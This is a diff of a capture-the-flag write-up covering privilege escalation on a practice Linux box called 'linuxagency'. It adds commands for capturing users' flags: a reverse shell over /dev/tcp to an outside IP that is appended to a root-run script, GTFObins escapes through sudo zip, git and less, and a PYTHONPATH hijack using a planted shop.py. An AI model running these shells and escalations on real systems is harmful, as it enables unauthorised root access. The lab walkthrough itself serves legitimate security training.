@@ -687,7 +687,7 @@ Find some information
 
 The file indicated is owned by viktor...  but executed with root privilege.  
 
-echo "bash -i >& /dev/tcp/10.67.108.130/5555 0>&1" >> /opt/scripts/47.sh  
+`:> echo "bash -i >& /dev/tcp/10.67.108.130/5555 0>&1" >> /opt/scripts/47.sh` 
 
 `:> nc -lvnp 5555` : open listener  
 
@@ -703,7 +703,8 @@ GTFObins has the answer
 
 ```bash
 :> TF=$(mktemp -u) # make the temp-file
-:> sudo -u silvio zip $TF /etc/hosts -T -TT '/bin/bash -i'
+:> sudo -u silvio zip $TF /etc/hosts -T -TT '/bin/bash #'
+:> python -c 'import pty;pty.spawn("/bin/bash")'
 :> id
 :> cd /home/silvio
 :> cat flag.txt
@@ -711,9 +712,86 @@ GTFObins has the answer
 
 ### What is reza's flag?
 
+`:> sudo -l`  
+
+```bash
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User silvio may run the following commands on linuxagency:
+    (reza) SETENV: NOPASSWD: /usr/bin/git
+
+```
+
+Look up `git` on [GTFOBINS](https://gtfobins.org/gtfobins/git/)  
+
+`:> sudo -u reza PAGER='/bin/sh -c "exec sh 0<&1"' git -p help`  
+
+`:> id`
+
+`:> cd /home/reza`  
+ 
+`:> cat flag.txt`
+
 ### What is jordan's flag?
 
+`:> sudo -l`  
+
+```bash
+User reza may run the following commands on linuxagency:
+    (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
+
+```
+
+`:> cat /opt/scripts/Gun-Shop.py` : no result; file not readable by anyone but jordan.  
+
+`:> strings /opt/scripts/Gun-Shop.py` : no result
+
+`:> sudo -u jordan /opt/scripts/Gun-Shop.py`
+
+```bash
+sudo -u jordan /opt/scripts/Gun-Shop.py
+Traceback (most recent call last):
+  File "/opt/scripts/Gun-Shop.py", line 2, in <module>
+    import shop
+```
+
+Search for python exploits...
+
+Exploit PYTHONPATH and missing library
+
+Create the missing library, which contains a call to create the bash shell
+`:> echo 'import os;os.system("/bin/bash")' > /tmp/shop.py`  
+
+Use PYTHONPATH to enable python to find the malicious library in the /tmp directory
+`:> sudo -u jordan PYTHONPATH=/tmp /opt/scripts/Gun-Shop.py`
+
+`:> cd /home/jordan`  
+
+`:> cat flag.txt  | rev`
+
 ### What is ken's flag?
+
+`:> sudo -l`  
+
+```bash
+jordan@linuxagency:~$ sudo -l
+sudo -l
+Matching Defaults entries for jordan on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jordan may run the following commands on linuxagency:
+    (ken) NOPASSWD: /usr/bin/less
+
+```
+
+Check out [GTFOBINS](https://gtfobins.org/gtfobins/less/#shell)  
+
+```bash
+ sudo -u ken less /etc/hosts
+ !/bin/sh
+```
 
 ### What is sean's flag?
 
